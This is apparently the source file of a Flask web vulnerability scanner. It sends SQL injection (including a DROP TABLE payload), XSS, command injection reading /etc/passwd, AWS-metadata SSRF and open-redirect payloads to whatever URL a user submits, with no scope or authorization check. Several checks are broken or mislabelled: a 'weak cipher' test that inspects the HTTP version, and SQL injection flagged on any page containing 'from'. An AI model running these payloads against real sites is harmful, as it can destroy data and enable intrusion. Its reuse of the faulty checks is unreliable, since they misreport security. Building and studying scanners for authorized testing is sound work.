from flask import Flask, render_template, request
import requests
import threading

app = Flask(__name__)

class AdvancedWebVulnScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []
        self.session = requests.Session()  # Session management for efficient and consistent requests

    def scan(self):
        # Launch threads for parallel scanning of different vulnerabilities
        threads = [
            threading.Thread(target=self.check_sql_injection),
            threading.Thread(target=self.check_xss),
            threading.Thread(target=self.check_csrf),
            threading.Thread(target=self.check_ssrf),
            threading.Thread(target=self.check_rce),
            threading.Thread(target=self.check_weak_ciphers),
            threading.Thread(target=self.check_open_redirects)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        return self.vulnerabilities

    def check_sql_injection(self):
        # SQL Injection payloads for various attack vectors
        payloads = [
            "' OR '1'='1",                             # Classic SQLi (Boolean-based)
            "' OR SLEEP(5)--",                         # Time-based SQLi for blind injections
            "'; DROP TABLE users; --",                 # Error-based SQLi (destructive)
            "' UNION SELECT NULL, version(), NULL --", # UNION-based SQLi (extracting DB version)
            "' UNION SELECT NULL, database(), NULL --",# Extract database name
            "' AND 1=0 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables --", # Table extraction
            "' AND 1=0 UNION ALL SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users' --", # Column extraction
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --", # PostgreSQL time-based blind
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --", # Boolean-based injection with data leakage
            "' OR 1=1--",                             # Simple SQLi to bypass authentication
        ]

        db_errors = [
            "SQL syntax", "Warning", "Mysql", "PostgreSQL", "SQLite", "SQLServer", "Oracle", 
            "ORA-", "syntax error", "unexpected", "division by zero", "unterminated"
        ]

        for payload in payloads:
            url = f"{self.base_url}?id={payload}"
            try:
                response = self.session.get(url, timeout=10)
                # Look for typical SQL errors in the response, which indicate vulnerability
                if any(error.lower() in response.text.lower() for error in db_errors):
                    self.vulnerabilities.append({
                        "type": "SQL Injection (Error-based)", 
                        "url": url, 
                        "payload": payload, 
                        "db_error": next(error for error in db_errors if error.lower() in response.text.lower())
                    })
                elif "select" in response.text.lower() or "from" in response.text.lower():
                    self.vulnerabilities.append({
                        "type": "SQL Injection (Union-based)",
                        "url": url,
                        "payload": payload,
                        "response": response.text[:200]  # Capture the first 200 characters of the response
                    })
                elif "SLEEP" in response.text or response.elapsed.total_seconds() > 4:  # Time-based detection
                    self.vulnerabilities.append({
                        "type": "SQL Injection (Time-based Blind)", 
                        "url": url, 
                        "payload": payload, 
                        "time_delay": response.elapsed.total_seconds()
                    })
            except requests.RequestException as e:
                self.vulnerabilities.append({
                    "type": "Error", 
                    "url": url, 
                    "message": str(e)
                })

    def check_xss(self):
        payloads = [
            "<script>alert('XSS')</script>", 
            "'><script>alert(1)</script>", 
            "'><img src=x onerror=alert(1)>"
        ]
        for payload in payloads:
            url = f"{self.base_url}?input={payload}"
            try:
                response = self.session.get(url)
                if payload in response.text:
                    self.vulnerabilities.append({"type": "Cross-Site Scripting (XSS)", "url": url})
            except requests.RequestException as e:
                self.vulnerabilities.append({"type": "Error", "url": url, "message": str(e)})

    def check_csrf(self):
        # Checking for the absence of CSRF tokens in forms or sensitive actions
        try:
            response = self.session.get(self.base_url)
            if 'csrf' not in response.text.lower():
                self.vulnerabilities.append({"type": "Cross-Site Request Forgery (CSRF)", "url": self.base_url})
        except requests.RequestException as e:
            self.vulnerabilities.append({"type": "Error", "url": self.base_url, "message": str(e)})

    def check_ssrf(self):
        # Attempt to exploit Server-Side Request Forgery by accessing internal services
        ssrf_payload = "http://169.254.169.254/latest/meta-data/"  # AWS internal service IP
        url = f"{self.base_url}?url={ssrf_payload}"
        try:
            response = self.session.get(url, timeout=10)
            if "ami-id" in response.text:  # Typical response for SSRF on AWS
                self.vulnerabilities.append({"type": "Server-Side Request Forgery (SSRF)", "url": url})
        except requests.RequestException as e:
            self.vulnerabilities.append({"type": "Error", "url": url, "message": str(e)})

    def check_rce(self):
        # Remote Code Execution via command injection payloads
        payloads = ["; uname -a", "; cat /etc/passwd", "`whoami`"]
        for payload in payloads:
            url = f"{self.base_url}?cmd={payload}"
            try:
                response = self.session.get(url, timeout=10)
                if any(keyword in response.text for keyword in ["root", "bin/bash", "Linux"]):
                    self.vulnerabilities.append({"type": "Remote Code Execution (RCE)", "url": url})
            except requests.RequestException as e:
                self.vulnerabilities.append({"type": "Error", "url": url, "message": str(e)})

    def check_weak_ciphers(self):
        # Test for weak SSL/TLS configurations
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.raw.version < 2:  # Check if using HTTP/1.1 or older
                self.vulnerabilities.append({"type": "Weak SSL/TLS Configuration", "url": self.base_url, "message": "Older HTTP version detected"})
        except requests.RequestException as e:
            self.vulnerabilities.append({"type": "Error", "url": self.base_url, "message": str(e)})

    def check_open_redirects(self):
        # Open Redirect vulnerabilities
        payloads = ["/?next=http://evil.com", "/?redirect=http://malicious.com"]
        for payload in payloads:
            url = f"{self.base_url}{payload}"
            try:
                response = self.session.get(url, timeout=10, allow_redirects=False)
                if response.status_code in [301, 302] and "evil.com" in response.headers.get('Location', ''):
                    self.vulnerabilities.append({"type": "Open Redirect", "url": url})
            except requests.RequestException as e:
                self.vulnerabilities.append({"type": "Error", "url": url, "message": str(e)})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    url_to_scan = request.form['url']
    scanner = AdvancedWebVulnScanner(url_to_scan)
    vulnerabilities = scanner.scan()
    return render_template('results.html', vulnerabilities=vulnerabilities, url=url_to_scan)

if __name__ == "__main__":
    app.run(debug=True)
